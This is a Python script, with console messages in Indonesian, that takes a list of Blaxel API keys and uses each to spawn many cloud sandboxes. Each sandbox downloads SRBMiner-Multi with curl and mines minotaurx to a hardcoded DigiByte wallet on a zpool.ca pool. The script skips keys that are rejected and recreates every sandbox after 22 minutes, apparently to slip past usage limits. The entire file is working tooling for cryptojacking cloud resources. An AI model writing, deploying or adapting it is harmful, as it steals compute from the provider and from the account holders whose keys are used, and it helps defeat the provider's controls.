import os
import sys
import time
import json
import signal
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Default Config
DEFAULT_CONFIG = {
    "mode": "srbminer",
    "slots_per_key": 10,
    "cpu_count": 2,
    "memory_mb": 4096,
    "duration_minutes": 22,
    "algorithm": "minotaurx",
    "host": "minotaurx.sea.mine.zpool.ca",
    "port": 7019,
    "worker_wallet": "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM",
    "password": "c=DGB",
    "keys_file": "list.txt",
    "concurrency_limit": 5,
    "spawn_delay_seconds": 0.5
}

is_running = True
active_sandboxes = {}
banned_keys = set()
lock = threading.Lock()

SYS_DIR = "/var/tmp/.srb_runner"
LOG_FILE = "/tmp/srbminer.log"
SRB_DOWNLOAD_URL = "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.6.5/SRBMiner-Multi-3-6-5-Linux.tar.gz"

def build_srbminer_bash_script(cfg, worker_label):
    algo = cfg.get("algorithm", "minotaurx")
    host = cfg.get("host", "minotaurx.sea.mine.zpool.ca")
    port = cfg.get("port", 7019)
    wallet = cfg.get("worker_wallet", "DPmJiSA9ZDRsphrFhTamUVf7TNakGtBzjM")
    password = cfg.get("password", "c=DGB")
    threads = cfg.get("cpu_count", 2)
    pool_address = f"stratum+tcp://{host}:{port}"

    return f"""#!/bin/bash
mkdir -p {SYS_DIR}
cd {SYS_DIR} || exit 1

if [ ! -f SRBMiner-MULTI ]; then
    echo "[{worker_label}] Downloading SRBMiner-MULTI v3.6.5..."
    curl -sL "{SRB_DOWNLOAD_URL}" -o srb.tar.gz
    tar -xzf srb.tar.gz --strip-components=1
    rm -f srb.tar.gz
fi

echo "[{worker_label}] Starting SRBMiner-MULTI ({algo})..."
./SRBMiner-MULTI \\
    --disable-gpu \\
    --algorithm {algo} \\
    --pool {pool_address} \\
    --wallet {wallet} \\
    --password {password},id={worker_label} \\
    --cpu-threads {threads}
"""

def parse_keys_file(filepath):
    if not os.path.exists(filepath):
        return []
    accounts = []
    with open(filepath, "r", encoding="utf-8-sig") as f:
        for line_no, raw_line in enumerate(f, 1):
            line = raw_line.strip()
            if not line or line.startswith("#"):
                continue
            token = line.split("|")[-1].strip() if "|" in line else line.strip()
            if token:
                accounts.append({
                    "index": line_no,
                    "label": f"acc-{line_no}",
                    "token": token
                })
    return accounts

def spawn_single_sandbox(cfg, account, slot_index):
    token = account["token"]
    label = account["label"]
    worker_name = f"srb-{label}-slot-{slot_index}"
    worker_key = f"{token[:12]}-{slot_index}"

    if token in banned_keys:
        return {"status": "banned", "worker_name": worker_name}

    print(f"    🚀 [{label}] Memulai Blaxel Sandbox Slot #{slot_index} ({worker_name})...")

    bash_script = build_srbminer_bash_script(cfg, worker_name)
    full_command = f"mkdir -p {SYS_DIR} && echo '{bash_script}' > {SYS_DIR}/run.sh && chmod +x {SYS_DIR}/run.sh && {SYS_DIR}/run.sh > {LOG_FILE} 2>&1 & tail -f /dev/null"

    url = "https://run.blaxel.ai/sandboxes"
    headers = {
        "X-Blaxel-Api-Key": token,
        "Content-Type": "application/json"
    }
    payload = {
        "name": worker_name,
        "resources": {
            "cpu": cfg.get("cpu_count", 2),
            "memory": f"{cfg.get('memory_mb', 4096)}Mi"
        },
        "spec": {
            "command": ["/bin/bash", "-c", full_command]
        }
    }

    try:
        resp = requests.post(url, headers=headers, json=payload, timeout=30)
        
        if resp.status_code in (401, 403):
            print(f"      🚫 Key {label} Invalid/Unauthorized (HTTP {resp.status_code}).")
            with lock:
                banned_keys.add(token)
            return {"status": "banned", "worker_name": worker_name}

        if resp.status_code in (200, 201):
            data = resp.json()
            sandbox_id = data.get("id") or data.get("name") or worker_name
            now = datetime.now()
            
            info = {
                "worker_name": worker_name,
                "sandbox_id": sandbox_id,
                "token": token,
                "slot_index": slot_index,
                "created_at": now,
                "status": "RUNNING"
            }
            with lock:
                active_sandboxes[worker_key] = info

            print(f"      🔥 [ACTIVE] {worker_name} Blaxel SRBMiner Running!\n")
            return {"status": "success", "info": info}
        else:
            print(f"      ❌ Gagal spawn {worker_name} [HTTP {resp.status_code}]: {resp.text}")
            return {"status": "error", "worker_name": worker_name, "error": resp.text}

    except Exception as e:
        err_msg = str(e)
        print(f"      ❌ Exception {worker_name}: {err_msg}")
        return {"status": "error", "worker_name": worker_name, "error": err_msg}

def deploy_all(cfg, accounts):
    slots = cfg.get("slots_per_key", 10)
    concurrency = cfg.get("concurrency_limit", 5)

    tasks = []
    for acc in accounts:
        if acc["token"] in banned_keys:
            continue
        for slot in range(1, slots + 1):
            tasks.append((acc, slot))

    if not tasks:
        print("⚠️ Tidak ada sandbox yang dapat dideploy.")
        return []

    print("\n=======================================================")
    print(f"📦 Total Target Sandbox : {len(tasks)} ({len(accounts)} Akun x {slots} Slots)")
    print(f"⚡ Mode Mining           : SRBMiner-MULTI Direct API ({cfg.get('algorithm', 'minotaurx')})")
    print("=======================================================\n")

    results = []
    spawn_delay = cfg.get("spawn_delay_seconds", 0.5)
    
    with ThreadPoolExecutor(max_workers=concurrency) as executor:
        futures = []
        for acc, slot in tasks:
            fut = executor.submit(spawn_single_sandbox, cfg, acc, slot)
            futures.append(fut)
            time.sleep(spawn_delay)

        for fut in as_completed(futures):
            results.append(fut.result())

    success_count = sum(1 for r in results if r["status"] == "success")
    print(f"\n📊 Ringkasan Deploy: {success_count}/{len(tasks)} Blaxel Sandbox Berhasil Aktif!\n")
    return results

def monitor_and_respawn_loop(cfg, accounts):
    global is_running
    slots = cfg.get("slots_per_key", 10)
    check_interval = 20
    start_time = datetime.now()
    target_duration_sec = cfg.get("duration_minutes", 22) * 60

    print("🔄 Mode Auto-Respawn Daemon AKTIF. Memonitor Blaxel Sandbox 24/7...")

    while is_running:
        try:
            now = datetime.now()
            uptime_str = str(now - start_time).split(".")[0]

            to_respawn = []
            with lock:
                for acc in accounts:
                    token = acc["token"]
                    if token in banned_keys:
                        continue
                    
                    for slot in range(1, slots + 1):
                        worker_key = f"{token[:12]}-{slot}"
                        if worker_key not in active_sandboxes:
                            to_respawn.append((acc, slot))
                        else:
                            info = active_sandboxes[worker_key]
                            elapsed_sec = (now - info["created_at"]).total_seconds()

                            if elapsed_sec >= target_duration_sec:
                                print(f"⏰ Sandbox {info['worker_name']} menyentuh {int(elapsed_sec//60)}m. Respawning...")
                                del active_sandboxes[worker_key]
                                to_respawn.append((acc, slot))

            if to_respawn:
                for acc, slot in to_respawn:
                    if not is_running:
                        break
                    spawn_single_sandbox(cfg, acc, slot)
                    time.sleep(0.5)

            with lock:
                active_count = len(active_sandboxes)

            print(f"[{now.strftime('%H:%M:%S')}] 🟢 Status: {active_count} Blaxel Sandbox Running | Uptime: {uptime_str}")
            
            for _ in range(check_interval):
                if not is_running:
                    break
                time.sleep(1)

        except Exception as e:
            print(f"⚠️ Error loop: {e}")
            time.sleep(5)

def signal_handler(sig, frame):
    global is_running
    print("\n🛑 Stopping Deployer...")
    is_running = False

def main():
    signal.signal(signal.SIGINT, signal_handler)

    keys_file = DEFAULT_CONFIG.get("keys_file", "list.txt")

    print(f"""
=============================================================
  ⚡ BLAXEL SRBMINER V3.6.5 AUTO-DEPLOYER (DIRECT HTTP API)
=============================================================
""")
    accounts = parse_keys_file(keys_file)
    if not accounts:
        print(f"❌ Error: File '{keys_file}' tidak ditemukan atau kosong!")
        sys.exit(1)

    deploy_all(DEFAULT_CONFIG, accounts)
    monitor_and_respawn_loop(DEFAULT_CONFIG, accounts)

if __name__ == "__main__":
    main()
